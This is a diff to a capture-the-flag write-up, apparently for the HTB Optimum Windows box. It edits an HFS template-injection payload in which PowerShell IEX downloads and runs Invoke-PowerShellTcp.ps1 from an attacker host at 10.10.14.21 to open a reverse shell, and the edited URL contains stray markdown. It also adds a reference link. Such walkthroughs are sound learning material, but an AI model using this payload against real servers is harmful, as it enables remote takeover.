@@ -65,7 +65,7 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
   - Start a reverse `Netcat` listener.
 
 ```CSS
-%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1').}
+%00{.exec|c:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe IEX(New-Object Net.WebClient).downloadstring('http://10.10.14.21:8000/Invoke-PowerShellTcp.ps1**w**').}
 ```
 ![image](https://user-images.githubusercontent.com/83878909/236139893-93d6cafd-91f1-4da8-94cc-4c2a5ca6079b.png)
 ![image](https://user-images.githubusercontent.com/83878909/236139759-484a70c3-ca74-4e01-9096-50befb2d0dc6.png)
@@ -199,3 +199,5 @@ VulnStatus : Not Vulnerable
 ```CSS
 ▶ 
 ```
+
+Optional Reference: https://0xdf.gitlab.io/2021/03/17/htb-optimum.html#the-importance-of-architecture
